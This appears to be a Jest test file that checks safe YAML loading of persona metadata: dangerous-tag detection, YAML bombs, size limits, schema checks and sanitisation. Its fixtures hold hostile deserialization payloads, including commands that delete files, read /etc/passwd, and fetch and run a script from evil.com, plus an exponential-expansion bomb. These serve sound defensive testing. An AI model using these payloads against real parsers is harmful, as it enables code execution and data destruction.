import { describe, test, expect } from '@jest/globals';
import { SecurityTestFramework } from '../setup.js';
import yaml from 'js-yaml';

describe('YAML Deserialization Security Tests', () => {
  describe('Dangerous YAML tags', () => {
    test('should detect JavaScript function injection', () => {
      const maliciousYaml = [
        `name: !!js/function "function(){require('child_process').exec('calc.exe')}"`,
        `exploit: !!js/function >\n  function() {\n    process.mainModule.require('child_process').exec('rm -rf /');\n  }`,
        `data: !!js/eval "process.exit()"`,
        `cmd: !!js/require child_process`
      ];
      
      for (const yaml of maliciousYaml) {
        expect(() => {
          // Using default schema (unsafe)
          // yaml.load(yaml); // This would execute code!
          
          // Should detect dangerous tags
          if (yaml.includes('!!js/')) {
            throw new Error('Dangerous YAML tag detected');
          }
        }).toThrow('Dangerous YAML tag detected');
      }
    });
    
    test('should detect Python object injection', () => {
      const pythonExploits = [
        `exploit: !!python/object/apply:os.system ["rm -rf /"]`,
        `rce: !!python/object/new:subprocess.Popen [["curl", "evil.com/shell.sh", "|", "sh"]]`,
        `backdoor: !!python/object/apply:subprocess.check_output [["cat", "/etc/passwd"]]`
      ];
      
      for (const yaml of pythonExploits) {
        expect(() => {
          if (yaml.includes('!!python/')) {
            throw new Error('Python object injection detected');
          }
        }).toThrow('Python object injection detected');
      }
    });
    
    test('should only allow CORE_SCHEMA types', () => {
      const safeYaml = `
name: Test Persona
description: A safe persona
version: 1.0.0
triggers:
  - hello
  - hi
`;
      
      // Safe loading with CORE_SCHEMA
      const loaded = yaml.load(safeYaml, {
        schema: yaml.CORE_SCHEMA
      });
      
      expect(loaded).toEqual({
        name: 'Test Persona',
        description: 'A safe persona',
        version: '1.0.0',
        triggers: ['hello', 'hi']
      });
      
      // Verify only basic types
      const loadedData = loaded as any;
      expect(typeof loadedData.name).toBe('string');
      expect(Array.isArray(loadedData.triggers)).toBe(true);
    });
  });
  
  describe('YAML bomb attacks', () => {
    test('should detect exponential entity expansion', () => {
      const yamlBomb = `
a: &a ["lol", "lol", "lol", "lol", "lol", "lol", "lol", "lol", "lol", "lol"]
b: &b [*a, *a, *a, *a, *a, *a, *a, *a, *a, *a]
c: &c [*b, *b, *b, *b, *b, *b, *b, *b, *b, *b]
d: &d [*c, *c, *c, *c, *c, *c, *c, *c, *c, *c]
e: &e [*d, *d, *d, *d, *d, *d, *d, *d, *d, *d]
`;
      
      expect(() => {
        // Check for excessive anchors/aliases
        const anchorCount = (yamlBomb.match(/&\w+/g) || []).length;
        const aliasCount = (yamlBomb.match(/\*\w+/g) || []).length;
        
        if (anchorCount > 10 || aliasCount > 20) {
          throw new Error('Potential YAML bomb detected');
        }
      }).toThrow('Potential YAML bomb detected');
    });
    
    test('should enforce size limits', () => {
      const largeYaml = 'x: "' + 'A'.repeat(100000) + '"';
      
      expect(() => {
        if (largeYaml.length > 50000) {
          throw new Error('YAML content too large');
        }
      }).toThrow('YAML content too large');
    });
  });
  
  describe('Schema validation', () => {
    test('should validate persona metadata schema', () => {
      const testCases = [
        {
          yaml: `
name: Valid Persona
description: A valid test persona
category: professional
`,
          valid: true
        },
        {
          yaml: `
name: ""
description: Invalid - empty name
`,
          valid: false
        },
        {
          yaml: `
name: ${'.'.repeat(101)}
description: Invalid - name too long
`,
          valid: false
        },
        {
          yaml: `
name: Injection Test
description: Test
malicious_field: !!js/function "alert()"
`,
          valid: false
        }
      ];
      
      for (const { yaml: yamlContent, valid } of testCases) {
        if (valid) {
          expect(() => {
            const data = yaml.load(yamlContent, { schema: yaml.CORE_SCHEMA }) as any;
            // Basic validation
            if (!data.name || data.name.length > 100) {
              throw new Error('Invalid name');
            }
            if (!data.description || data.description.length > 1000) {
              throw new Error('Invalid description');
            }
          }).not.toThrow();
        } else {
          expect(() => {
            // Check for dangerous content first
            if (yamlContent.includes('!!')) {
              throw new Error('Dangerous tag');
            }
            
            const data = yaml.load(yamlContent, { schema: yaml.CORE_SCHEMA }) as any;
            if (!data || !data.name || data.name.length === 0 || data.name.length > 100) {
              throw new Error('Invalid name');
            }
          }).toThrow();
        }
      }
    });
    
    test('should sanitize string fields', () => {
      const inputs = [
        { input: 'Normal text', expected: 'Normal text' },
        { input: '<script>alert("XSS")</script>', expected: 'scriptalert("XSS")/script' },
        { input: 'Text\u0000with\u0000nulls', expected: 'Textwithnulls' },
        { input: 'Line1\nLine2\rLine3', expected: 'Line1 Line2 Line3' },
        { input: '  Trimmed  ', expected: 'Trimmed' }
      ];
      
      for (const { input, expected } of inputs) {
        const sanitized = input
          .replaceAll(/[<>]/g, '')
          .replaceAll('\u0000', '')
          .replaceAll(/[\r\n]/g, ' ')
          .trim();
        
        expect(sanitized).toBe(expected);
      }
    });
  });
  
  describe('gray-matter integration', () => {
    test('should use safe options with gray-matter', () => {
      // Simulate safe gray-matter usage
      const safeOptions = {
        engines: {
          yaml: (str: string) => yaml.load(str, { schema: yaml.CORE_SCHEMA })
        }
      };
      
      expect(safeOptions.engines.yaml).toBeDefined();
      
      // Test that it rejects dangerous content
      expect(() => {
        const dangerous = 'name: !!js/function "alert()"';
        safeOptions.engines.yaml(dangerous);
      }).toThrow();
    });
  });
  
  describe('Content validation', () => {
    test('should validate array fields', () => {
      const testCases = [
        {
          triggers: ['hello', 'hi', 'hey'],
          valid: true
        },
        {
          triggers: Array(25).fill('trigger'), // Too many
          valid: false
        },
        {
          triggers: ['a'.repeat(60)], // Individual item too long
          valid: false
        }
      ];
      
      for (const { triggers, valid } of testCases) {
        if (valid) {
          expect(triggers.length).toBeLessThanOrEqual(20);
          expect(triggers.every(t => t.length <= 50)).toBe(true);
        } else {
          expect(
            triggers.length > 20 || 
            triggers.some(t => t.length > 50)
          ).toBe(true);
        }
      }
    });
  });
});